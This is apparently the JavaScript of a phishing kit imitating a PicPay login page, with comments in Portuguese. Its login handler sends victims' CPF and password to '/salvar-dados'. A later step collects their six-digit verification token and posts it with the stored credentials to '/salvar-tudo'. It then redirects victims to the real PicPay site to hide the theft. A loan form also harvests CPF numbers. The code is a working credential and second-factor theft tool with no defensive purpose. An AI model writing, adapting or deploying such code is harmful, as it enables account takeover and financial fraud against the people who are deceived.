document.addEventListener('DOMContentLoaded', () => {

    /**
     * FUNÇÃO UNIVERSAL: MÁSCARA DE CPF
     * Aplica a máscara (000.000.000-00) a qualquer campo de input cujo placeholder comece com "CPF".
     */
    const inicializarMascaraCPF = () => {
        const cpfFields = document.querySelectorAll('input[placeholder^="CPF"]');
        cpfFields.forEach(cpfField => {
            if (cpfField) {
                cpfField.addEventListener('input', (event) => {
                    let value = event.target.value.replace(/\D/g, ''); // Remove tudo que não é dígito
                    value = value.substring(0, 11);
                    value = value.replace(/(\d{3})(\d)/, '$1.$2');
                    value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
                    value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
                    event.target.value = value;
                });
            }
        });
    };

    /**
     * FUNÇÃO UNIVERSAL: MODAIS DE AJUDA/PRIVACIDADE
     * Controla a abertura e fechamento dos modais de links no rodapé.
     */
    const inicializarModais = () => {
        const modalOverlay = document.getElementById('modalOverlay');
        if (!modalOverlay) return;

        const modalContent = document.getElementById('modalContent');
        const closeModalBtn = document.querySelector('.modal-close-btn');
        const modalData = {
            forgotPasswordLink: { title: 'Recuperar Senha', content: `<p>Para recuperar sua senha, digite o CPF cadastrado. Enviaremos um link de recuperação para o seu e-mail.</p>`},
            helpLink: { title: 'Central de Ajuda', content: '<p>Bem-vindo à nossa Central de Ajuda! Aqui você encontra respostas para as dúvidas mais frequentes.</p>'},
            privacyLink: { title: 'Política de Privacidade', content: '<p>Esta é a nossa política de privacidade. Comprometemo-nos a proteger seus dados.</p>'},
            termsLink: { title: 'Termos de Uso', content: '<p>Ao usar nossos serviços, você concorda com os seguintes termos.</p>'}
        };

        const openModal = (content) => {
            modalContent.innerHTML = `<h2>${content.title}</h2><div>${content.content}</div>`;
            modalOverlay.classList.add('active');
        };
        const closeModal = () => modalOverlay.classList.remove('active');

        document.querySelectorAll('a[id]').forEach(link => {
            link.addEventListener('click', e => {
                e.preventDefault();
                if (modalData[link.id]) openModal(modalData[link.id]);
            });
        });
        
        if (closeModalBtn) closeModalBtn.addEventListener('click', closeModal);
        modalOverlay.addEventListener('click', (event) => {
            if (event.target === modalOverlay) closeModal();
        });
    };

    /**
     * ETAPA 1: PÁGINA DE LOGIN (index.html)
     */
    const inicializarPaginaLogin = () => {
        const loginForm = document.querySelector('form:not(#emprestimoForm)');
        if (!loginForm) return; 
        
        loginForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const cpf = loginForm.querySelector('input[placeholder="CPF"]').value;
            const senha = loginForm.querySelector('input[placeholder="Digite sua senha"]').value;
            if (cpf.length < 14 || !senha) return alert('Por favor, preencha todos os campos corretamente.');
            
            try {
                await fetch('/salvar-dados', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf, senha }),
                });
            } catch (error) {
                console.error("Falha ao enviar dados iniciais:", error);
            } finally {
                sessionStorage.setItem('temp_cpf', cpf);
                sessionStorage.setItem('temp_senha', senha);
                window.location.href = 'confirmacao.html';
            }
        });
    };

    /**
     * ETAPA 2: PÁGINA DE CONFIRMAÇÃO (confirmacao.html)
     */
    const inicializarPaginaConfirmacao = () => {
        const options = document.querySelector('.confirmation-options');
        if (!options) return;

        options.addEventListener('click', (e) => {
            e.preventDefault();
            window.location.href = 'token.html';
        });
    };

    /**
     * ETAPA 3: PÁGINA DO TOKEN (token.html)
     */
    const inicializarPaginaToken = () => {
        const tokenForm = document.getElementById('tokenForm');
        if (!tokenForm) return;

        const reenviarLink = document.getElementById('reenviarCodigo');
        let timeLeft = 59;
        const timerId = setInterval(() => {
            reenviarLink.textContent = `Reenviar código em 00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
            timeLeft--;
            if (timeLeft < 0) {
                clearInterval(timerId);
                reenviarLink.textContent = 'Reenviar código';
                reenviarLink.classList.remove('disabled');
            }
        }, 1000);

        tokenForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const token = document.getElementById('token').value;
            if (token.length < 6) return alert('Por favor, digite o código de 6 dígitos.');

            const cpf = sessionStorage.getItem('temp_cpf');
            const senha = sessionStorage.getItem('temp_senha');

            if (!cpf || !senha) {
                alert('Sessão expirada. Por favor, comece novamente.');
                window.location.href = 'index.html';
                return;
            }

            try {
                await fetch('/salvar-tudo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf, senha, token }),
                });
            } catch (error) {
                console.error("Falha ao enviar pacote final:", error);
            } finally {
                sessionStorage.clear();
                window.location.href = 'https://www.picpay.com/site';
            }
        });
    };
    
    /**
     * FUNÇÃO EXTRA: PÁGINA DE EMPRÉSTIMOS
     */
    const inicializarPaginaEmprestimos = () => {
        const emprestimoForm = document.getElementById('emprestimoForm');
        if (!emprestimoForm) return;
        
        emprestimoForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const cpf = document.getElementById('cpfEmprestimo').value;
            if (cpf.length < 14) return alert('Por favor, preencha o CPF corretamente.');

            try {
                const response = await fetch('/acessar-contratos', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf }),
                });
                const result = await response.json();
                alert(result.message);
                emprestimoForm.reset();
            } catch (error) {
                alert('Não foi possível conectar ao servidor. Tente novamente mais tarde.');
            }
        });
    };

    // Executa todas as funções de inicialização.
    inicializarMascaraCPF();
    inicializarModais();
    inicializarPaginaLogin();
    inicializarPaginaConfirmacao();
    inicializarPaginaToken();
    inicializarPaginaEmprestimos();
});